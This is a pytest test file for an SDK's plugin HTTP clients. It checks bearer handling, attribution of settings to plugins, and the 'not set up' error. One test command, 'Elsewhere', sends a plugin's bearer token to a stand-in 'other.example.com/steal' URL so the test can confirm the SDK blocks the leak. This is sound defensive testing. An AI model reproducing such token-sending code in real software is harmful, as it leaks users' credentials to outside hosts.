"""``self.ctx.http.client(settings, base_url=..., bearer=...)``: a plugin's clients, built by core.

The client is attributed to the plugin whose settings model it is given,
sends the bearer to its own origin only, and a blank URL is that plugin's
"not set up".
"""

from __future__ import annotations

from collections.abc import Callable

import httpx
import pytest
import respx
from pydantic import BaseModel, Field

from untaped.sdk import Command, Credential, CredentialKey, Plugin
from untaped.sdk.testing import Install

Installer = Callable[..., Install]

_URL = "https://api.example.com"


class DeskSettings(BaseModel):
    url: str = Field("", description="The desk's API.")


class Whoami(Command[DeskSettings]):
    """Ask the desk who the token is."""

    def run(self) -> str:
        client = self.ctx.http.client(self.settings, base_url=self.settings.url, bearer="tok")
        seen = client.get("/me").request.headers.get("authorization")
        return f"{client.system} {seen}"


class Elsewhere(Command[DeskSettings]):
    """Send the desk's token to another site."""

    def run(self) -> str:
        client = self.ctx.http.client(self.settings, base_url=self.settings.url, bearer="tok")
        client.get("https://other.example.com/steal")
        return "sent"


class Desk(Plugin):
    """Answer questions (a test's plugin)."""

    settings = DeskSettings
    commands = (Whoami, Elsewhere)


@respx.mock
def test_a_client_is_the_plugin_s_and_carries_its_bearer(install: Installer) -> None:
    respx.get(f"{_URL}/me").mock(return_value=httpx.Response(200, json={}))
    ran = install(Desk, settings=DeskSettings(url=_URL)).run(Whoami())
    assert ran.text == "desk Bearer tok"


def test_the_bearer_never_leaves_its_origin(install: Installer) -> None:
    ran = install(Desk, settings=DeskSettings(url=_URL)).run(Elsewhere())
    assert ran.exit != 0
    assert "other.example.com" in "\n".join(ran.stderr)
    assert "sent" not in ran.stdout


def test_a_blank_url_is_the_plugin_not_set_up(install: Installer) -> None:
    ran = install(Desk).run(Whoami())
    assert ran.exit != 0
    assert "desk is not set up" in ran.stderr[0]


class LockedSettings(BaseModel):
    url: str = Field("", description="The locked desk's API.")


class LockedKey(CredentialKey):
    name: str = "locked"


class Ask(Command[LockedSettings]):
    """Ask the locked desk who the token is."""

    def run(self) -> str:
        return self.ctx.http.client(self.settings, base_url=self.settings.url).system


class Locked(Plugin):
    """Answer questions behind a key (a test's plugin)."""

    settings = LockedSettings
    commands = (Ask,)
    token = Credential(key=LockedKey, env=("LOCKED_TOKEN",))


def test_a_client_is_the_plugin_s_when_its_settings_are_core_s_subclass(
    install: Installer,
) -> None:
    # a plugin with a credential has its settings loaded as core's subclass of its model
    ran = install(Locked, settings=LockedSettings(url=_URL)).cli("locked ask")
    assert (ran.exit, ran.text) == (0, "locked"), ran.stderr


@respx.mock
def test_a_client_class_s_test_takes_the_kit_s_factory(install: Installer) -> None:
    respx.get(f"{_URL}/me").mock(return_value=httpx.Response(200, json={}))
    with install(Desk).running() as run:
        client = run.http.client(DeskSettings(), base_url=_URL, bearer="tok")
        seen = client.get("/me").request.headers.get("authorization")
    assert (client.system, seen) == ("desk", "Bearer tok")


def test_a_subclass_of_a_plugin_s_settings_is_no_plugin_s(install: Installer) -> None:
    class Wider(LockedSettings):
        """A model of its own, which merely extends locked's."""

    from untaped.sdk._run import current_run

    with install(Locked).running():
        composition = current_run().composition
        assert composition.owner_of_settings(LockedSettings) == "locked"
        with pytest.raises(LookupError):
            composition.owner_of_settings(Wider)


def test_a_provider_and_the_run_build_the_same_plugin_s_clients(install: Installer) -> None:
    from untaped.sdk._run import current_run, provider_context

    settings = LockedSettings(url=_URL)
    with install(Locked).running():
        built = (
            provider_context("locked").http.client(settings, base_url=_URL),
            current_run().http.client(
                settings, base_url=_URL
            ),  # doctor reaches it outside a command
        )
    assert [client.system for client in built] == ["locked", "locked"]
